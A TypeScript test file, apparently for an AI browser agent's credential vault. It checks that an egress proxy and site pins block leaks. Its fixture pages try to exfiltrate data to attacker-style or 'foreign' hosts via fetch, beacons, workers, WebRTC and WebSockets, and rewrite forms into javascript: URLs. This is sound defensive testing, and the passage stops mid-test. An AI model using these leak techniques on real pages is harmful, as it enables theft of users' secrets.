// @effect-diagnostics nodeBuiltinImport:off - drives a local Chromium against local HTTP fixtures.
import * as NodeCrypto from "@effect/platform-node/NodeCrypto";
import * as NodeServices from "@effect/platform-node/NodeServices";
import { assert, describe, it } from "@effect/vitest";
import * as Effect from "effect/Effect";
import * as FileSystem from "effect/FileSystem";
import * as Layer from "effect/Layer";
import * as Fiber from "effect/Fiber";
import * as NodeChildProcess from "node:child_process";
import * as NodeDgram from "node:dgram";
import * as NodeFSP from "node:fs/promises";
import * as NodeHttp from "node:http";
import * as NodeNet from "node:net";
import * as NodeOS from "node:os";
import * as NodePath from "node:path";
import {
  allowedBy,
  browserAgent,
  clickAllowedBy,
  historyEntry,
  makeBrowsers,
  onSecretHost,
  profileOf,
  requestAllowedBy,
  sshLaunchArgs,
  type PageAction,
  type Pin,
  type SecretKind,
} from "./browser.ts";
import { egressFlags, isPrivateAddress, startEgressProxy } from "./egress.ts";
import type { Gmail } from "./gmail.ts";
import { makeFlows } from "./oauth.ts";
import type { OAuthClient } from "./services.ts";
import type { Slack } from "./slack.ts";
import { makeVault } from "./Vault.ts";
import * as VaultStore from "./VaultStore.ts";
import { jpegSize } from "./jpeg.ts";

const history = { currentIndex: 1, entries: [{ id: 10 }, { id: 11 }, { id: 12 }] };

it("applies the pin to every network request type", () => {
  const pin: Pin = { site: "account.example", origins: ["cdn.example"] };
  for (const url of [
    "https://attacker.example/pixel",
    "wss://attacker.example/socket",
    "https://attacker.example/redirect",
  ])
    assert.isFalse(requestAllowedBy(pin, url));
  assert.isTrue(requestAllowedBy(pin, "https://cdn.example/script.js"));
  assert.isTrue(allowedBy(pin, "https://account.example/login"));
});

it.each([
  ["https://olx.ua/login", "olx.ua", true],
  ["https://www.olx.ua/login", "olx.ua", true],
  ["https://m.olx.ua/login", "olx.ua", false],
  ["https://olx.ua.evil.example/", "olx.ua", false],
  ["http://olx.ua/login", "olx.ua", false],
  ["https://olx.ua:8443/login", "olx.ua", false],
  ["https://accounts.google.com/signin", "accounts.google.com", true],
  ["https://mail.google.com/", "accounts.google.com", false],
  ["http://127.0.0.1:8080/login", "127.0.0.1:8080", true],
  ["http://127.0.0.1:8081/login", "127.0.0.1:8080", false],
] as const)("a secret for %s typed on %s: %s", (url, site, typed) => {
  assert.equal(onSecretHost(url, site), typed);
});

it("refuses click targets that execute a page script", () => {
  assert.isTrue(clickAllowedBy(null));
  assert.isTrue(clickAllowedBy("https://account.example/next"));
  assert.isFalse(clickAllowedBy("javascript:document.title='leaked'"));
  assert.isFalse(clickAllowedBy("data:text/html,leaked"));
  assert.isTrue(clickAllowedBy("about:blank#top", "about:blank"));
  assert.isFalse(clickAllowedBy("about:blank#top", "https://account.example/"));
});

const sessionsHost = (host: string) => ({
  host,
  user: "rejects-sessions",
  identityFile: "/key",
  knownHostsFile: "/known",
});

it.each(["127.0.0.1", "localhost", "::1"])(
  "a sessions host on this machine (%s) needs no tunnel: the browser reaches the proxy directly",
  (host) => {
    const args = sshLaunchArgs(sessionsHost(host), "olx.ua", 38001);
    assert.notInclude(args, "-R");
    assert.notInclude(args.join(" "), "ExitOnForwardFailure");
    assert.equal(args.at(-1), "open olx.ua 38001");
  },
);

it("a remote sessions host gets the proxy port forwarded to its own loopback", () => {
  const args = sshLaunchArgs(sessionsHost("192.168.1.28"), "olx.ua", 38001);
  assert.deepEqual(args.slice(args.indexOf("-R"), args.indexOf("-R") + 2), [
    "-R",
    "127.0.0.1:38001:127.0.0.1:38001",
  ]);
  assert.include(args, "ExitOnForwardFailure=yes");
  assert.equal(args.at(-1), "open olx.ua 38001");
});

const proxyAnswer = (proxyPort: number, request: string) =>
  new Promise<string>((resolve, reject) => {
    const socket = NodeNet.connect(proxyPort, "127.0.0.1", () => socket.write(request));
    let reply = "";
    socket.on("data", (chunk) => {
      reply += chunk.toString("latin1");
      if (reply.includes("\r\n")) {
        socket.destroy();
        resolve(reply.split("\r\n")[0] ?? "");
      }
    });
    socket.on("error", reject);
    socket.on("close", () => resolve(reply.split("\r\n")[0] ?? ""));
  });

it("the proxy refuses a name that resolves to a private address, whatever the pin says", async () => {
  let connections = 0;
  const target = NodeNet.createServer((socket) => {
    connections++;
    socket.destroy();
  });
  await new Promise<void>((resolve) => target.listen(0, "127.0.0.1", resolve));
  const targetPort = (target.address() as NodeNet.AddressInfo).port;
  const proxy = await startEgressProxy({ allows: () => true, permitPrivate: () => true });
  try {
    const connect = (host: string) =>
      proxyAnswer(proxy.port, `CONNECT ${host}:${targetPort} HTTP/1.1\r\nHost: ${host}\r\n\r\n`);
    // `localhost` resolves to 127.0.0.1; a permission for literal addresses does not extend to it.
    assert.match(await connect("localhost"), /403/);
    assert.match(await connect("127.0.0.1"), /200/);
    assert.equal(connections, 1);
    const plain = await proxyAnswer(
      proxy.port,
      `GET http://localhost:${targetPort}/ HTTP/1.1\r\nHost: localhost\r\n\r\n`,
    );
    assert.match(plain, /403/);
  } finally {
    proxy.close();
    target.close();
  }
  const closed = await startEgressProxy({ allows: () => true });
  try {
    assert.match(
      await proxyAnswer(closed.port, "CONNECT 127.0.0.1:80 HTTP/1.1\r\nHost: x\r\n\r\n"),
      /403/,
    );
  } finally {
    closed.close();
  }
});

it("closing the proxy's connections ends a plain-HTTP request still in flight", async () => {
  let originSocketClosed: () => void = () => {};
  const closed = new Promise<void>((resolve) => {
    originSocketClosed = resolve;
  });
  let arrived: () => void = () => {};
  const requested = new Promise<void>((resolve) => {
    arrived = resolve;
  });
  const origin = NodeHttp.createServer((request, response) => {
    request.socket.on("close", originSocketClosed);
    response.writeHead(200, { "content-type": "text/plain" });
    response.write("start");
    arrived();
  });
  await new Promise<void>((resolve) => origin.listen(0, "127.0.0.1", resolve));
  const originPort = (origin.address() as NodeNet.AddressInfo).port;
  const proxy = await startEgressProxy({ allows: () => true, permitPrivate: () => true });
  const client = NodeNet.connect(proxy.port, "127.0.0.1", () =>
    client.write(
      `GET http://127.0.0.1:${originPort}/slow HTTP/1.1\r\nHost: 127.0.0.1:${originPort}\r\n\r\n`,
    ),
  );
  client.on("error", () => undefined);
  try {
    await requested;
    proxy.closeConnections();
    await closed;
  } finally {
    client.destroy();
    proxy.close();
    origin.closeAllConnections();
    origin.close();
  }
});

it("the proxy takes the free ports of its range and fails when there are none", async () => {
  const policy = { allows: () => false };
  const first = await startEgressProxy(policy, [38400, 38401]);
  const second = await startEgressProxy(policy, [38400, 38401]);
  try {
    assert.deepEqual([first.port, second.port].toSorted(), [38400, 38401]);
    await startEgressProxy(policy, [38400, 38401]).then(
      () => assert.fail("a third proxy found a port"),
      (error: Error) => assert.match(error.message, /no free port/i),
    );
  } finally {
    first.close();
    second.close();
  }
});

it.each([
  { ip: "127.0.0.1", private: true },
  { ip: "10.1.2.3", private: true },
  { ip: "172.20.0.1", private: true },
  { ip: "192.168.1.27", private: true },
  { ip: "169.254.169.254", private: true },
  { ip: "100.100.100.100", private: true },
  { ip: "::1", private: true },
  { ip: "::", private: true },
  { ip: "fd00::1", private: true },
  { ip: "fe80::1", private: true },
  { ip: "fe80::1%eth0", private: true },
  { ip: "ff02::1", private: true },
  { ip: "::ffff:192.168.0.1", private: true },
  { ip: "::ffff:7f00:1", private: true },
  { ip: "0:0:0:0:0:ffff:7f00:1", private: true },
  { ip: "0000:0000:0000:0000:0000:FFFF:7F00:0001", private: true },
  { ip: "::7f00:1", private: true },
  { ip: "::127.0.0.1", private: true },
  { ip: "::ffff:0:7f00:1", private: true },
  { ip: "64:ff9b::7f00:1", private: true },
  { ip: "64:ff9b::192.168.0.1", private: true },
  { ip: "64:ff9b:1::1", private: true },
  { ip: "2002:7f00:1::", private: true },
  { ip: "2002:c0a8:1::1", private: true },
  { ip: "2001::1", private: true },
  { ip: "2001:db8::1", private: true },
  { ip: "not an address", private: true },
  { ip: "198.18.0.1", private: true },
  { ip: "198.19.255.254", private: true },
  { ip: "192.0.2.1", private: true },
  { ip: "192.0.0.1", private: true },
  { ip: "198.51.100.7", private: true },
  { ip: "203.0.113.9", private: true },
  { ip: "192.88.99.1", private: true },
  { ip: "198.20.0.1", private: false },
  { ip: "192.0.3.1", private: false },
  { ip: "192.88.100.1", private: false },
  { ip: "8.8.8.8", private: false },
  { ip: "172.32.0.1", private: false },
  { ip: "2606:4700::1111", private: false },
  { ip: "2a00:1450:4001:81b::200e", private: false },
  { ip: "::ffff:8.8.8.8", private: false },
  { ip: "::ffff:808:808", private: false },
  { ip: "64:ff9b::808:808", private: false },
  { ip: "2002:808:808::1", private: false },
])("the egress proxy treats $ip as private: $private", ({ ip, private: expected }) => {
  assert.equal(isPrivateAddress(ip), expected);
});

it.each([
  { direction: "back", from: history, id: 10 },
  { direction: "forward", from: history, id: 12 },
  { direction: "back", from: { ...history, currentIndex: 0 }, id: null },
  { direction: "forward", from: { ...history, currentIndex: 2 }, id: null },
] as const)("$direction from entry $from.currentIndex lands on $id", ({ direction, from, id }) => {
  assert.equal(historyEntry(from, direction)?.id ?? null, id);
});

it.each([
  { profile: "slack.com", desktop: true },
  { profile: "acme.slack.com", desktop: true },
  { profile: "notslack.com", desktop: false },
  { profile: "classroom.google.com", desktop: false },
])("the $profile browser is a desktop Chrome: $desktop", ({ profile, desktop }) => {
  const agent = browserAgent("Chrome/156.0.7000.1", profile);
  assert.deepEqual(
    [
      agent.userAgentMetadata.mobile,
      agent.userAgentMetadata.platform,
      /Android|Mobile/.test(agent.userAgent),
    ],
    desktop ? [false, "Linux", false] : [true, "Android", true],
  );
});

// quarantine: #2 Chromium popup and CDP calls time out at random.
describe.skip("vault browser in Chromium", () => {
  const chromium = ["chromium", "chromium-browser", "google-chrome"].find(
    (name) => NodeChildProcess.spawnSync("sh", ["-c", `command -v ${name}`]).status === 0,
  );

  const serve = (pages: Record<string, string>, host = "127.0.0.1") =>
    Effect.acquireRelease(
      Effect.promise(async () => {
        const hits: string[] = [];
        const reached = { connections: 0, datagrams: 0 };
        const waiters = new Map<string, Array<() => void>>();
        const gates = new Map<string, Promise<void>>();
        const server = NodeHttp.createServer((request, response) => {
          const path = request.url ?? "/";
          hits.push(path);
          for (const wake of waiters.get(path) ?? []) wake();
          void (gates.get(path) ?? Promise.resolve()).then(() => {
            if (path.startsWith("/http")) response.writeHead(302, { location: path.slice(1) });
            else
              response.writeHead(path in pages ? 200 : 404, {
                "content-type": path.endsWith(".js") ? "application/javascript" : "text/html",
              });
            response.end(pages[path]);
          });
        });
        server.on("connection", () => reached.connections++);
        const held = new Set<NodeNet.Socket>();
        const closedSockets = new Set<string>();
        server.on("upgrade", (request, socket: NodeNet.Socket) => {
          hits.push(request.url ?? "/");
          for (const wake of waiters.get(request.url ?? "/") ?? []) wake();
          held.add(socket);
          socket.on("error", () => undefined);
          // The peer's FIN is the close: the server keeps its half open until it ends it. A reset
          // (the proxy cutting the tunnel) ends the socket without a FIN.
          const closed = () => {
            socket.destroy();
            closedSockets.add(request.url ?? "/");
            for (const wake of waiters.get(`closed:${request.url ?? "/"}`) ?? []) wake();
          };
          socket.on("end", closed);
          socket.on("close", closed);
        });
        await new Promise<void>((resolve) => server.listen(0, host, resolve));
        const { port } = server.address() as NodeNet.AddressInfo;
        const udp = NodeDgram.createSocket("udp4");
        udp.on("message", () => reached.datagrams++);
        await new Promise<void>((resolve) => udp.bind(port, host, resolve));
        return {
          server,
          udp,
          held,
          hits,
          reached,
          port,
          gate: (path: string) => {
            let release = () => {};
            gates.set(
              path,
              new Promise<void>((resolve) => {
                release = resolve;
              }),
            );
            return release;
          },
          socketClosed: (path: string) =>
            closedSockets.has(path)
              ? Promise.resolve()
              : new Promise<void>((resolve) =>
                  waiters.set(`closed:${path}`, [
                    ...(waiters.get(`closed:${path}`) ?? []),
                    resolve,
                  ]),
                ),
          requested: (path: string) =>
            hits.includes(path)
              ? Promise.resolve()
              : new Promise<void>((resolve) =>
                  waiters.set(path, [...(waiters.get(path) ?? []), resolve]),
                ),
          origin: `http://${host}:${port}`,
          site: `${host}:${port}`,
        };
      }),
      ({ server, udp, held }) =>
        Effect.promise(() => {
          udp.close();
          for (const socket of held) socket.destroy();
          server.closeAllConnections();
          return new Promise<void>((resolve) => server.close(() => resolve()));
        }),
    );

  const received = (site: {
    hits: string[];
    reached: { connections: number; datagrams: number };
  }) => ({
    hits: site.hits,
    ...site.reached,
  });
  const nothing = { hits: [], connections: 0, datagrams: 0 };

  const chromiumBrowsers = (options: Parameters<typeof makeBrowsers>[2] = {}) =>
    Effect.gen(function* () {
      const dir = yield* Effect.acquireRelease(
        Effect.promise(() => NodeFSP.mkdtemp(NodePath.join(NodeOS.tmpdir(), "t3-vault-browser-"))),
        (path) =>
          Effect.promise(() =>
            NodeFSP.rm(path, { recursive: true, force: true, maxRetries: 5 }).catch(
              () => undefined,
            ),
          ),
      );
      const browsers = makeBrowsers(
        { host: "", user: "", identityFile: "", knownHostsFile: "" },
        (_profile, proxyPort) =>
          NodeChildProcess.spawn(
            "sh",
            [
              "-c",
              `dir="$1"; shift; exec "$0" --headless=new --no-sandbox --remote-debugging-pipe --user-data-dir="$dir" "$@" about:blank 3<&0 4>&1 >/dev/null 2>&1`,
              chromium ?? "chromium",
              dir,
              "--disable-blink-features=AutomationControlled",
              ...egressFlags(proxyPort),
            ],
            { stdio: ["pipe", "pipe", "pipe"] },
          ),
        { permitPrivate: (host) => host === "127.0.0.1" || host === "127.0.0.2", ...options },
      );
      yield* Effect.addFinalizer(() => browsers.close("profile"));
      return browsers;
    });
  const chromiumProfile = chromiumBrowsers();

  const page = (title: string, body = "") =>
    `<!doctype html><title>${title}</title><body><h1>${title}</h1>${body}</body>`;

  it.live(
    "an account page stays on its site and allowed sites, redirects and popups included",
    () =>
      Effect.gen(function* () {
        if (chromium === undefined) return;
        const foreign = yield* serve({ "/": page("Foreign") });
        const partner = yield* serve({ "/": page("Partner") });
        const home = yield* serve({
          "/": page(
            "Home",
            `<script>
          try { new Worker(URL.createObjectURL(new Blob([\`fetch('${foreign.origin}/worker-leak')\`], {type: 'text/javascript'}))); } catch {}
          fetch('${foreign.origin}/fetch-leak').catch(() => {});
          new Image().src = '${foreign.origin}/image-leak';
          navigator.sendBeacon('${foreign.origin}/beacon-leak', 'secret');
          ServiceWorkerContainer.prototype.register.call(navigator.serviceWorker, '/sw.js').catch(() => {});
        </script>
        <form action="/safe" onsubmit="this.action='javascript:document.title=0'"><input placeholder="Rewritten to a script"></form>
        <form action="/safe" onsubmit="this.action='javascript:document.title=0'"><input type="password" placeholder="Secret"></form>
        <form action="/safe" onsubmit="this.action='${foreign.origin}/form-leak'"><input placeholder="Rewritten off site"></form>
        <form action="/safe"><input placeholder="Plain form"></form>
        <form action="/safe" target="_blank"><input placeholder="Blank form"></form>
        <form action="/safe" onsubmit="event.preventDefault(); fetch('/ajax')"><input placeholder="Ajax form"></form>
        <input placeholder="Keyed" onkeydown="if (event.key === 'Enter') { event.preventDefault(); document.title = 'keyed'; }">
        <a href="#">Top link</a> <a href="#section">Section link</a>
        <input id="mixed" type="PASSWORD" placeholder="Mixed">
        <script>
          // A page that strips the vault's mark from a field it was typed into.
          const mixed = document.getElementById('mixed');
          new MutationObserver(() => mixed.removeAttribute('data-vault-secret'))
            .observe(mixed, { attributes: true });
        </script>
        <input placeholder="Message">
        <input placeholder="Code" autocomplete="one-time-code">
        <a href="javascript:document.title=document.querySelector('input').value">Script link</a>
        <input value="typed-secret">
        <a id="race-link" href="/safe" onclick="this.href='javascript:document.title=0'">Race link</a>
        <a id="cancel-link" href="/safe" onclick="event.preventDefault(); document.title='cancelled'">Cancel link</a>
        <a href="/${foreign.origin}/">Redirect away</a>
        <a href="/${partner.origin}/">Redirect to partner</a>
        <button onclick="location.href='${foreign.origin}/'">Script away</button>
        <button onclick="window.open('${foreign.origin}/')">Popup away</button>
        <button onclick="window.open('${partner.origin}/')">Popup to partner</button>
        <a href="${foreign.origin}/" target="_blank">New tab away</a>`,
          ),
          "/safe": page("Safe"),
          "/ajax": "",
          "/sw.js": `self.addEventListener('install', (event) =>
        event.waitUntil(fetch('${foreign.origin}/sw-leak').catch(() => {})));`,
        });
        const hitCount = (path: string) =>
          home.hits.filter((hit) => hit.split("?")[0] === path).length;
        const browsers = yield* chromiumProfile;
        const pin: Pin = { site: home.site, origins: [partner.site] };
        const act = (input: PageAction) => browsers.act("profile", pin, input);
        const clickOnHome = (label: string) =>
          Effect.gen(function* () {
            const { text } = yield* act({ action: "open", url: `${home.origin}/` });
            const ref = new RegExp(`\\[(e\\d+) \\w+ "${label}"`).exec(text)?.[1];
            assert.isDefined(ref, text);
            return yield* act({ action: "click", ref: ref! });
          });
        const away = [
          yield* act({ action: "open", url: `${foreign.origin}/` }),
          yield* clickOnHome("Redirect away"),
          yield* clickOnHome("Script away"),
          yield* clickOnHome("Popup away"),
          yield* clickOnHome("New tab away"),
        ];
        for (const result of away) {
          assert.equal(result.blocked, `${foreign.origin}/`);
          assert.notEqual(result.title, "Foreign");
        }
        assert.deepEqual(foreign.hits, []);

        const { text: scriptPage } = yield* act({ action: "open", url: `${home.origin}/` });
        assert.equal((yield* act({ action: "snapshot" })).title, "Home");
        const scriptRef = /\[(e\d+) link "Script link"/.exec(scriptPage)?.[1];
        assert.isDefined(scriptRef, scriptPage);
        const scriptError = yield* Effect.flip(act({ action: "click", ref: scriptRef! }));
        assert.match(scriptError.message, /link scheme is not allowed/);

        const { text: racePage } = yield* act({ action: "open", url: `${home.origin}/` });
        const raceRef = /\[(e\d+) link "Race link"/.exec(racePage)?.[1];
        assert.isDefined(raceRef, racePage);
        const raceResult = yield* act({ action: "click", ref: raceRef! });
        assert.deepEqual([raceResult.url, raceResult.title], [`${home.origin}/`, "Home"]);
        assert.equal(hitCount("/safe"), 0);

        const { text: cancelPage } = yield* act({ action: "open", url: `${home.origin}/` });
        const cancelRef = /\[(e\d+) link "Cancel link"/.exec(cancelPage)?.[1];
        assert.isDefined(cancelRef, cancelPage);
        const cancelResult = yield* act({ action: "click", ref: cancelRef! });
        assert.equal(cancelResult.title, "cancelled");
        assert.equal(cancelResult.url, `${home.origin}/`);

        const enterIn = (label: string) =>
          Effect.gen(function* () {
            const { text } = yield* act({ action: "open", url: `${home.origin}/` });
            const ref = new RegExp(`\\[(e\\d+) textbox "${label}"`).exec(text)?.[1];
            assert.isDefined(ref, text);
            yield* act({ action: "click", ref: ref! });
            return yield* act({ action: "press", key: "Enter" });
          });
        const toScript = yield* Effect.flip(enterIn("Rewritten to a script"));
        assert.match(toScript.message, /form submits to javascript:.*not submitted/);
        const toForeign = yield* Effect.flip(enterIn("Rewritten off site"));
        assert.match(toForeign.message, /not on 127\.0\.0\.1/);
        assert.equal(hitCount("/safe"), 0);
        const { text: submitPage } = yield* act({ action: "open", url: `${home.origin}/` });
        const submitRef = /\[(e\d+) textbox "Secret"/.exec(submitPage)?.[1];
        assert.isDefined(submitRef, submitPage);
        const submitError = yield* Effect.flip(
          act({
            action: "type",
            ref: submitRef!,
            text: "secret",
            submit: true,
            secret: { site: home.site, kind: "password" },
          }),
        );
        assert.match(submitError.message, /form submits to javascript:/);
        assert.equal(hitCount("/safe"), 0);

        // A form that stays on the site is submitted once, into the page itself even when it names
        // another target.
        const plainForm = yield* enterIn("Plain form");
        assert.equal(new URL(plainForm.url).pathname, "/safe");
        assert.equal(hitCount("/safe"), 1);
        const blankForm = yield* enterIn("Blank form");
        assert.equal(new URL(blankForm.url).pathname, "/safe");
        assert.equal(hitCount("/safe"), 2);

        const keyed = yield* enterIn("Keyed");
        assert.equal(keyed.title, "keyed");
        const ajax = yield* enterIn("Ajax form");
        assert.equal(ajax.url, `${home.origin}/`);
        assert.equal(hitCount("/ajax"), 1);
        assert.equal(hitCount("/safe"), 2);

        const { text: fragmentPage } = yield* act({ action: "open", url: `${home.origin}/` });
        for (const [label, hash] of [
          ["Top link", "#"],
          ["Section link", "#section"],
        ] as const) {
          const ref = new RegExp(`\\[(e\\d+) link "${label}"`).exec(fragmentPage)?.[1];
          assert.isDefined(ref, fragmentPage);
          const { url } = yield* act({ action: "click", ref: ref! });
          assert.equal(url, `${home.origin}/${hash}`);
        }

        const { text: fieldPage } = yield* act({ action: "open", url: `${home.origin}/` });
        const typeSecret = (label: string, kind: SecretKind = "password", site = home.site) => {
          const ref = new RegExp(`\\[(e\\d+) textbox "${label}"`).exec(fieldPage)?.[1];
          assert.isDefined(ref, fieldPage);
          return act({
            action: "type",
            ref: ref!,
            text: "hunter2",
            submit: false,
            secret: { site, kind },
          });
        };
        yield* typeSecret("Mixed");
        const { text: mixedText } = yield* act({ action: "snapshot" });
        assert.match(mixedText, /textbox "Mixed"\]/);
        assert.notInclude(mixedText, "hunter2");
        const elsewhere = yield* Effect.flip(typeSecret("Code", "code", "other.example"));
        assert.match(elsewhere.message, /not on other\.example/);
        // A password typed into a text field would be readable in the next snapshot.
        assert.match((yield* Effect.flip(typeSecret("Message"))).message, /not a password field/);
        assert.match((yield* Effect.flip(typeSecret("Code"))).message, /not a password field/);
        yield* typeSecret("Code", "code");
        yield* typeSecret("Message", "username");
        const { text: afterSecret } = yield* act({ action: "snapshot" });
        assert.match(afterSecret, /textbox "Message"\]/);
        assert.notInclude(afterSecret, "hunter2");

        for (const label of ["Redirect to partner", "Popup to partner"]) {
          const { title, blocked } = yield* clickOnHome(label);
          assert.deepEqual({ title, blocked }, { title: "Partner", blocked: null });
        }
        assert.deepEqual(foreign.hits, []);
      }).pipe(Effect.scoped),
  );

  it.live("nothing leaves a page except through the egress proxy and the pin", () =>
    Effect.gen(function* () {
      if (chromium === undefined) return;
      const foreign = yield* serve({ "/": page("Foreign") });
      const host = `127.0.0.1:${foreign.port}`;
      const socketUrl = `ws://${host}/socket`;
      const home = yield* serve({
        "/": page(
          "Home",
          `<link rel="dns-prefetch" href="${foreign.origin}">
        <link rel="preconnect" href="${foreign.origin}">
        <script>
          try {
            const pc = new RTCPeerConnection({ iceServers: [{
              urls: ['stun:${host}', 'turn:${host}?transport=udp', 'turn:${host}?transport=tcp'],
              username: 'secret-user', credential: 'secret-pass',
            }] });
            pc.createDataChannel('x');
            pc.createOffer().then((offer) => pc.setLocalDescription(offer));
          } catch {}
          try { new WebSocket('${socketUrl}'); } catch {}
          try { new WebTransport('${foreign.origin}/transport'); } catch {}
          // Gathering and the handshakes start within a moment; this page reports when they had time.
          setTimeout(() => fetch('/done'), 2500);
        </script>`,
        ),
      });
      const browsers = yield* chromiumProfile;
      const pin: Pin = { site: home.site, origins: [] };
      const opened = yield* browsers.act("profile", pin, {
        action: "open",
        url: `${home.origin}/`,
      });
      yield* Effect.promise(() => home.requested("/done"));
      assert.deepEqual(received(foreign), nothing);
      assert.equal(opened.blocked, socketUrl);
    }).pipe(Effect.scoped),
  );

  it.live("frames and workers run behind the same filter as the page", () =>
    Effect.gen(function* () {
      if (chromium === undefined) return;
      const foreign = yield* serve({ "/": page("Foreign") });
      const frame = yield* serve(
        {
          "/": page(
            "Frame",
            `<script>
            const socket = new WebSocket('ws://127.0.0.1:${foreign.port}/frame-socket');
            Promise.allSettled([
              fetch('${foreign.origin}/frame-leak'),
              new Promise((settled) => { socket.onerror = socket.onclose = settled; }),
            ]).then(() => fetch('/done'));
          </script>`,
          ),
          "/done": "",
        },
        "127.0.0.2",
      );
      const home = yield* serve({
        "/": page(
          "Home",
          `<iframe src="${frame.origin}/"></iframe>
        <script>
          const worker = new Worker(URL.createObjectURL(new Blob([
            "fetch('${foreign.origin}/worker-leak').then(() => postMessage('reached'), () => postMessage('refused'))",
          ], { type: 'text/javascript' })));
          worker.onmessage = (event) => fetch('/worker-' + event.data);
        </script>`,
        ),
        "/worker-reached": "",
        "/worker-refused": "",
      });
      const browsers = yield* chromiumProfile;
      const pin: Pin = { site: home.site, origins: [frame.site] };
      yield* browsers.act("profile", pin, { action: "open", url: `${home.origin}/` });
      yield* Effect.promise(() =>
        Promise.all([
          frame.requested("/done"),
          Promise.race([home.requested("/worker-reached"), home.requested("/worker-refused")]),
        ]),
      );
      assert.include(home.hits, "/worker-refused");
      assert.notInclude(home.hits, "/worker-reached");
      assert.deepEqual(received(foreign), nothing);
    }).pipe(Effect.scoped),
  );

  it.live("a site loads its asset origins and nothing else off site", () =>
    Effect.gen(function* () {
      if (chromium === undefined) return;
      const foreign = yield* serve({ "/": page("Foreign") });
      const cdn = yield* serve({
        "/": page("Cdn"),
        "/pic.png": "",
        "/app.js": "document.title = 'assets loaded';",
      });
      const home = yield* serve({
        "/": page(
          "Home",
          `<img src="${cdn.origin}/pic.png">
        <img src="${foreign.origin}/pic.png">
        <script src="${cdn.origin}/app.js"></script>`,
        ),
      });
      const browsers = yield* chromiumProfile;
      const pin: Pin = { site: home.site, origins: [], assets: [cdn.site] };
      const opened = yield* browsers.act("profile", pin, {
        action: "open",
        url: `${home.origin}/`,
      });
      assert.equal(opened.title, "assets loaded");
      assert.deepEqual(cdn.hits.toSorted(), ["/app.js", "/pic.png"]);
      assert.deepEqual(received(foreign), nothing);
      assert.isNull(opened.blocked);
      const away = yield* browsers.act("profile", pin, { action: "open", url: `${cdn.origin}/` });
      assert.equal(away.blocked, `${cdn.origin}/`);
      assert.notInclude(cdn.hits, "/");
    }).pipe(Effect.scoped),
  );

  it.live(
    "a sign-in sheet waits for the bot action in flight, which keeps the pin until it ends",
    () =>
      Effect.gen(function* () {
        if (chromium === undefined) return;
        const foreign = yield* serve({ "/": page("Foreign") });
        const home = yield* serve({
          "/": page("Home"),
          "/slow": page("Slow", `<script>fetch('${foreign.origin}/late').catch(() => {})</script>`),
        });
        const release = home.gate("/slow");
        const browsers = yield* chromiumProfile;
        const pin: Pin = { site: home.site, origins: [] };
        const action = yield* Effect.forkChild(
          browsers.act("profile", pin, { action: "open", url: `${home.origin}/slow` }),
        );
        yield* Effect.promise(() => home.requested("/slow"));
        const sheet = yield* Effect.forkChild(browsers.openSheet("profile", `${home.origin}/`));
        release();
        assert.equal((yield* Fiber.join(action)).title, "Slow");
        yield* Fiber.join(sheet);
        assert.isTrue(browsers.sheetOpen("profile"));
        assert.deepEqual(received(foreign), nothing);
        const refused = yield* Effect.flip(browsers.act("profile", pin, { action: "snapshot" }));
        assert.match(refused.message, /sign-in sheet/);
      }).pipe(Effect.scoped),
  );

  it.live(
    "the proxy refuses loopback written as a mapped IPv6 address, even while the sheet is open",
    () =>
      Effect.gen(function* () {
        if (chromium === undefined) return;
        const foreign = yield* serve({ "/": page("Foreign") });
        const home = yield* serve({
          "/": page(
            "Home",
            `<script>
          fetch('http://[::ffff:7f00:1]:${foreign.port}/mapped')
            .catch(() => {})
            .then(() => fetch('/done'));
        </script>`,
          ),
        });
        const browsers = yield* chromiumProfile;
        yield* browsers.openSheet("profile", `${home.origin}/`);
        yield* Effect.promise(() => home.requested("/done"));
        assert.deepEqual(received(foreign), nothing);
      }).pipe(Effect.scoped),
  );

  const socketPage = (title: string) =>
    page(title, `<script>new WebSocket('ws://' + location.host + '/hold');</script>`);

  it.live("a socket opened under one pin dies when the pin changes", () =>
    Effect.gen(function* () {
      if (chromium === undefined) return;
      const home = yield* serve({ "/": socketPage("Home") });
      const browsers = yield* chromiumProfile;
      yield* browsers.act(
        "profile",
        { site: home.site, origins: [] },
        { action: "open", url: `${home.origin}/` },
      );
      yield* Effect.promise(() => home.requested("/hold"));
      yield* browsers.act(
        "profile",
        { site: home.site, origins: ["partner.example"] },
        { action: "snapshot" },
      );
      yield* Effect.promise(() => home.socketClosed("/hold"));
    }).pipe(Effect.scoped),
  );

  it.live("closing the sheet ends what it left open and blanks the page when no pin exists", () =>
    Effect.gen(function* () {
      if (chromium === undefined) return;
      const home = yield* serve({ "/": socketPage("Home") });
      const browsers = yield* chromiumProfile;
      yield* browsers.openSheet("profile", `${home.origin}/`);
      yield* Effect.promise(() => home.requested("/hold"));
      yield* browsers.closeSheet("profile");
      yield* Effect.promise(() => home.socketClosed("/hold"));
      assert.isFalse(browsers.sheetOpen("profile"));
      const again = yield* browsers.act(
        "profile",
        { site: home.site, origins: [] },
        { action: "open", url: `${home.origin}/` },
      );
      assert.equal(again.title, "Home");
    }).pipe(Effect.scoped),
  );

  it.live("closing the sheet puts the last pin back and ends what the sheet left open", () =>
    Effect.gen(function* () {
      if (chromium === undefined) return;
      const foreign = yield* serve({ "/": page("Foreign") });
      const home = yield* serve({
        "/": socketPage("Home"),
        "/second": page("Second"),
      });
      const browsers = yield* chromiumProfile;
      const pin: Pin = { site: home.site, origins: [] };
      yield* browsers.act("profile", pin, { action: "snapshot" }).pipe(Effect.ignore);
      yield* browsers.openSheet("profile", `${home.origin}/`);
      yield* Effect.promise(() => home.requested("/hold"));
      yield* browsers.closeSheet("profile");
      yield* Effect.promise(() => home.socketClosed("/hold"));
      const same = yield* browsers.act("profile", pin, {
        action: "open",
        url: `${home.origin}/second`,
      });
      assert.equal(same.title, "Second");
      const away = yield* browsers.act("profile", pin, {
        action: "open",
        url: `${foreign.origin}/`,
      });
      assert.equal(away.blocked, `${foreign.origin}/`);
      assert.deepEqual(received(foreign), nothing);
    }).pipe(Effect.scoped),
  );

  it.live("snapshot labels, values and links are not cut, so the vault can scrub them whole", () =>
    Effect.gen(function* () {
      if (chromium === undefined) return;
      const label = `${"x".repeat(115)}TAIL-OF-A-LONG-LABEL`;
      const path = `/${"p".repeat(290)}-end`;
      const home = yield* serve({
        "/": page(
          "Home",
          `<button>${label}</button>
        <a href="${path}">${label}</a>
        <input placeholder="${label}" value="${"v".repeat(130)}-end">`,
        ),
      });
      const browsers = yield* chromiumProfile;
      const { text } = yield* browsers.act(
        "profile",
        { site: home.site, origins: [] },
        { action: "open", url: `${home.origin}/` },
      );
      assert.include(text, `button "${label}"`);
      assert.include(text, `link "${label}" -> ${home.origin}${path}]`);
